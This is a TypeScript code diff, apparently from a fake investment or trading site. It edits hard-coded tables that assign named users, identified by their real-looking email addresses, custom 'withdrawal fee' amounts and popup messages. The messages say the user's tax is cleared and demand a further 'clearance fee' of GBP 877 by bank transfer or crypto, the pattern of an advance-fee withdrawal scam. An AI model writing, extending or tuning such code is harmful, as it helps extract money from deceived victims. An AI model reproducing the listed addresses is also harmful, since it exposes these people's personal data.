@@ -445,7 +445,7 @@ const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "
   "ttvcurser@gmail.com": { amount: 500, currency: "GBP" },
   "tzahielk@gmail.com": { amount: 450, currency: "GBP" },
   "ajamibilal@yahoo.com": { amount: 493, currency: "USD" },
-  "obitoplutowrld@gmail.com": { amount: 531, currency: "GBP" },
+  "obitoplutowrld@gmail.com": { amount: 877, currency: "GBP" },
   "obitoplutoworld@gmail.com": { amount: 877, currency: "GBP" }
 };
 const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
@@ -460,7 +460,7 @@ const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
     "Tax cleared successfully. Congratulations. To proceed with withdrawal, please clear the withdrawal fee of $493.00."
   ,
   "obitoplutowrld@gmail.com":
-    "Congratulations on clearing your taxes. A refundable withdrawal fee of GBP 531.00 is now required to finalize your withdrawal.",
+    "Congratulations, your tax requirement has been fully cleared and your progress is at 100%. To proceed with your withdrawal, a clearance fee of GBP 877.00 is required. Choose your withdrawal method and submit your request: Bank Transfer or Crypto.",
   "obitoplutoworld@gmail.com":
     "Congratulations, your tax requirement has been fully cleared and your progress is at 100%. To proceed with your withdrawal, a clearance fee of GBP 877.00 is required. Choose your withdrawal method and submit your request: Bank Transfer or Crypto.",
   "josiahbauman03@gmail.com":
@@ -510,7 +510,9 @@ const TAX_CLEARED_POPUP_BY_EMAIL: Record<string, string> = {
     "Tax cleared successfully. Congratulations. To proceed with withdrawal, please clear the withdrawal fee of $493.00."
   ,
   "obitoplutowrld@gmail.com":
-    "Congratulations on clearing your taxes. A refundable withdrawal fee of GBP 531.00 is now required to finalize your withdrawal."
+    "Congratulations, your tax requirement has been fully cleared and your progress is at 100%. To proceed with your withdrawal, a clearance fee of GBP 877.00 is required. Choose your withdrawal method and submit your request: Bank Transfer or Crypto.",
+  "obitoplutoworld@gmail.com":
+    "Congratulations, your tax requirement has been fully cleared and your progress is at 100%. To proceed with your withdrawal, a clearance fee of GBP 877.00 is required. Choose your withdrawal method and submit your request: Bank Transfer or Crypto."
 };
 const USER_PLAN_OVERRIDE_BY_EMAIL: Record<
   string,
